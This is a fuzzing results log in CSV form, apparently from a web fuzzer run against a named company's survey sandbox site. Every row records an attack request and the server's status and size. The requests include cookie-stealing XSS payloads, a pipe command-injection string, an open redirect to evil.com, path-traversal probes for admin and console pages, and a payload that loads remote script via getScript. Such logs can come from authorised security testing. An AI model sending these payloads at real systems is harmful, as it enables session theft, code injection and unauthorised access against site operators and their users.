FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,https://survey-sandbox.officevibe.com/servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,,15840,500,75,12,1,text/html,847.798706ms,
hostapd_ssid=.*/hostapd_ssid=\\\,https://survey-sandbox.officevibe.com/hostapd_ssid=.*/hostapd_ssid=\\\,https://survey-sandbox.officevibe.com/hostapd_ssid=.*/hostapd_ssid=,18108,301,1414,270,21,text/html; charset=UTF-8,158.851193ms,
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://survey-sandbox.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://sandbox.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey-sandbox.officevibe.com%2f%3fmobile%3d1%26mp_idx%3d%2522%3b%24.getScript(%2527%2f%2f127.0.0.1%2fz%2527)%3b,20499,302,290,6,4,text/html; charset=utf-8,304.453613ms,
config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E,https://survey-sandbox.officevibe.com/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E,,42062,500,75,12,1,text/html,163.930869ms,
cgi-bin/post32.exe|dir%20c:\,https://survey-sandbox.officevibe.com/cgi-bin/post32.exe|dir%20c:\,https://survey-sandbox.officevibe.com/cgi-bin/post32.exe|dir c:,44391,301,1410,271,21,text/html; charset=UTF-8,245.744341ms,
.,https://survey-sandbox.officevibe.com/.,https://sandbox.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey-sandbox.officevibe.com,59964,302,207,6,4,text/html; charset=utf-8,88.915056ms,
?mod=<script>alert(document.cookie)</script>&op=browse,https://survey-sandbox.officevibe.com/?mod=<script>alert(document.cookie)</script>&op=browse,,87084,500,75,12,1,text/html,196.944795ms,
//evil.com/%2F..,https://survey-sandbox.officevibe.com///evil.com/%2F..,https://sandbox.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey-sandbox.officevibe.com,106852,302,207,6,4,text/html; charset=utf-8,83.230581ms,
#/../admin,https://survey-sandbox.officevibe.com/#/../admin,https://sandbox.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey-sandbox.officevibe.com,113455,302,207,6,4,text/html; charset=utf-8,77.255564ms,
guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E,https://survey-sandbox.officevibe.com/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E,,128944,500,75,12,1,text/html,302.384828ms,
log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E,https://survey-sandbox.officevibe.com/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E,,150066,500,75,12,1,text/html,114.834781ms,
#/../console,https://survey-sandbox.officevibe.com/#/../console,https://sandbox.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey-sandbox.officevibe.com,162227,302,207,6,4,text/html; charset=utf-8,77.867557ms,
_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X,https://survey-sandbox.officevibe.com/_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X,,166344,500,75,12,1,text/html,105.148497ms,
#/../manager/text,https://survey-sandbox.officevibe.com/#/../manager/text,https://sandbox.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey-sandbox.officevibe.com,168130,302,207,6,4,text/html; charset=utf-8,75.54703ms,
